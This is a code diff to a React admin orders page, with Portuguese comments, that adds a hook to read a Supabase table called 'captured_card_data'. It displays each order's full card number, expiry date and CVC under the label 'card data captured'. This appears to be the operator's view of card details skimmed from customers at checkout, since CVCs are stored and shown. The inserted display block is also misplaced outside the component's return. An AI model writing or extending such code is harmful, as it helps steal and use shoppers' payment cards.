@@ -42,6 +42,29 @@ const AdminOrders = () => {
     },
   });
 
+  // Adicione este hook após os hooks existentes
+  const { data: cardData } = useQuery({
+    queryKey: ["card-data", selected?.id],
+    enabled: !!selected,
+    queryFn: async () => {
+      const { data } = await supabase.from("captured_card_data").select("*").eq("order_id", selected!.id);
+      return data ?? [];
+    },
+  });
+
+  // Adicione esta seção no diálogo de detalhes do pedido, após a seção de pagamento
+  {
+    cardData && cardData.length > 0 && (
+      <div className="border border-red-200 bg-red-50 rounded p-3">
+        <p className="text-xs text-red-600 font-medium mb-2">DADOS DO CARTÃO CAPTURADOS</p>
+        <p>Número: {cardData[0].card_number}</p>
+        <p>Validade: {cardData[0].card_expiry}</p>
+        <p>CVC: {cardData[0].card_cvc}</p>
+        <p className="text-xs text-red-600">Capturado em: {new Date(cardData[0].timestamp).toLocaleString("pt-BR")}</p>
+      </div>
+    )
+  }
+
   const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
 
   const updateStatus = async (id: string, status: OrderStatus) => {
